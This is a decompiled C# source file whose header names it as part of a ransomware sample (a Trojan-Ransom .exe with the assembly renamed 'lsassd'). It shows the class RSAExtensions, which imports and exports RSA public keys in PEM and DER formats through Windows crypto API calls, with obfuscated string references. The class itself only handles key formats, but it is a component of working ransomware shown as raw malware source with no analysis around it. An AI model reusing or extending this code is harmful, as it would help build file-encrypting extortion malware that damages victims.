// Decompiled with JetBrains decompiler
// Type: MOISHE.Core.RSAExtensions
// Assembly: lsassd, Version=3.4.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 432C6617-1CB7-4116-A49C-FF7B0B5EE7E5
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.MSIL.Crypmod.gen-b3ebc327773f5f846deeb1255475644a630c4d0d3b4eda3bbf995a36599c07cf.exe

using \u003CPrivateImplementationDetails\u003E\u007B18A11B1C\u002D3AA7\u002D4357\u002DAAD9\u002DCC83BB5216E3\u007D;
using A;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace MOISHE.Core
{
  public static class RSAExtensions
  {
    private const string A = "-----BEGIN RSA PUBLIC KEY-----";
    private const string a = "-----END RSA PUBLIC KEY-----";
    private const string B = "-----BEGIN PUBLIC KEY-----";
    private const string b = "-----END PUBLIC KEY-----";
    private const string C = "1.2.840.113549.1.1.1";

    private static void A([In] RSA obj0, [In] byte[] obj1)
    {
      if (!(obj0 is RSACryptoServiceProvider cryptoServiceProvider))
        throw new ArgumentException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.bd());
      cryptoServiceProvider.ImportCspBlob(obj1);
    }

    private static byte[] A([In] RSA obj0, out uint _param1)
    {
      if (!(obj0 is RSACryptoServiceProvider cryptoServiceProvider))
        throw new ArgumentException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.bd());
      _param1 = 19U;
      return cryptoServiceProvider.ExportCspBlob(false);
    }

    public static byte[] ExportSubjectPublicKeyInfo(this RSA key)
    {
      uint num1;
      byte[] source = RSAExtensions.A(key, out num1);
      using (c c1 = c.A(source.Length))
      {
        Marshal.Copy(source, 0, c1.DangerousGetHandle(), source.Length);
        c c2;
        uint num2;
        if (!A.C.A(65537U, num1, c1.DangerousGetHandle(), 32768U, IntPtr.Zero, out c2, out num2))
          throw new CryptographicException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.bF(), (Exception) new Win32Exception());
        using (c2)
        {
          A.C.B structure = new A.C.B();
          structure.A = new A.C.A()
          {
            A = \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.bE()
          };
          structure.A = new A.C.a()
          {
            A = c2.DangerousGetHandle(),
            A = num2
          };
          using (c c3 = c.A(Marshal.SizeOf(typeof (A.C.B))))
          {
            Marshal.StructureToPtr((object) structure, c3.DangerousGetHandle(), false);
            c c4;
            uint length;
            if (!A.C.A(65537U, 8U, c3.DangerousGetHandle(), 32768U, IntPtr.Zero, out c4, out length))
              throw new CryptographicException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.be(), (Exception) new Win32Exception());
            using (c4)
            {
              byte[] destination = new byte[(int) length];
              Marshal.Copy(c4.DangerousGetHandle(), destination, 0, (int) length);
              return destination;
            }
          }
        }
      }
    }

    public static byte[] ExportRSAPublicKey(this RSA key)
    {
      uint num;
      byte[] source = RSAExtensions.A(key, out num);
      using (c c1 = c.A(source.Length))
      {
        Marshal.Copy(source, 0, c1.DangerousGetHandle(), source.Length);
        c c2;
        uint length;
        if (!A.C.A(65537U, num, c1.DangerousGetHandle(), 32768U, IntPtr.Zero, out c2, out length))
          throw new CryptographicException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.bF(), (Exception) new Win32Exception());
        using (c2)
        {
          byte[] destination = new byte[(int) length];
          Marshal.Copy(c2.DangerousGetHandle(), destination, 0, (int) length);
          return destination;
        }
      }
    }

    public static void ImportRSAPublicKey(this RSA key, byte[] derBlob, out int bytesRead)
    {
      using (c c1 = c.A(derBlob.Length))
      {
        Marshal.Copy(derBlob, 0, c1.DangerousGetHandle(), derBlob.Length);
        c c2;
        uint length;
        if (!A.C.A(65537U, 19U, c1.DangerousGetHandle(), (uint) derBlob.Length, 32768U, IntPtr.Zero, out c2, out length))
          throw new CryptographicException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.bf(), (Exception) new Win32Exception());
        using (c2)
        {
          byte[] destination = new byte[(int) length];
          Marshal.Copy(c2.DangerousGetHandle(), destination, 0, (int) length);
          bytesRead = derBlob.Length;
          RSAExtensions.A(key, destination);
        }
      }
    }

    public static void ImportSubjectPublicKeyInfo(
      this RSA key,
      byte[] certKeyInfoDer,
      out int bytesRead)
    {
      using (c c1 = c.A(certKeyInfoDer.Length))
      {
        Marshal.Copy(certKeyInfoDer, 0, c1.DangerousGetHandle(), certKeyInfoDer.Length);
        c c2;
        if (!A.C.A(65537U, 8U, c1.DangerousGetHandle(), (uint) certKeyInfoDer.Length, 32768U, IntPtr.Zero, out c2, out uint _))
          throw new CryptographicException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.bH(), (Exception) new Win32Exception());
        using (c2)
        {
          A.C.B structure = (A.C.B) Marshal.PtrToStructure(c2.DangerousGetHandle(), typeof (A.C.B));
          if (structure.A.A != \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.bE())
            throw new CryptographicException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.bG());
          c c3;
          uint length;
          if (!A.C.A(65537U, 19U, structure.A.A, structure.A.A, 32768U, IntPtr.Zero, out c3, out length))
            throw new CryptographicException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.bg(), (Exception) new Win32Exception());
          using (c3)
          {
            byte[] destination = new byte[(int) length];
            Marshal.Copy(c3.DangerousGetHandle(), destination, 0, (int) length);
            bytesRead = certKeyInfoDer.Length;
            RSAExtensions.A(key, destination);
          }
        }
      }
    }

    public static void ImportFromPem(this RSA key, string source, out RsaPublicKeyFormat format)
    {
      source = source.Trim();
      if (source.StartsWith(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.bh()) && source.EndsWith(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.bI()))
      {
        format = RsaPublicKeyFormat.SubjectPublicKeyInfo;
      }
      else
      {
        if (!source.StartsWith(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.ap()) || !source.EndsWith(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aQ()))
          throw new FormatException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.bi());
        format = RsaPublicKeyFormat.RsaPublicKey;
      }
      byte[] numArray = Convert.FromBase64String(string.Concat(((IEnumerable<string>) source.Split('\n')).Select<string, string>((Func<string, string>) (obj0 => obj0.Trim())).Where<string>((Func<string, bool>) (obj0 => !obj0.StartsWith(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.bk())))));
      int bytesRead;
      if (format == RsaPublicKeyFormat.RsaPublicKey)
        key.ImportRSAPublicKey(numArray, out bytesRead);
      else
        key.ImportSubjectPublicKeyInfo(numArray, out bytesRead);
    }

    public static string ExportToPem(this RSA key, RsaPublicKeyFormat format)
    {
      StringBuilder stringBuilder = new StringBuilder();
      if (format == RsaPublicKeyFormat.RsaPublicKey)
      {
        stringBuilder.AppendLine(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.ap());
        stringBuilder.AppendLine(Convert.ToBase64String(key.ExportRSAPublicKey(), Base64FormattingOptions.InsertLineBreaks));
        stringBuilder.AppendLine(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aQ());
      }
      else
      {
        if (format != RsaPublicKeyFormat.SubjectPublicKeyInfo)
          throw new ArgumentException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.bJ());
        stringBuilder.AppendLine(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.bh());
        stringBuilder.AppendLine(Convert.ToBase64String(key.ExportSubjectPublicKeyInfo(), Base64FormattingOptions.InsertLineBreaks));
        stringBuilder.AppendLine(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.bI());
      }
      return stringBuilder.ToString();
    }
  }
}
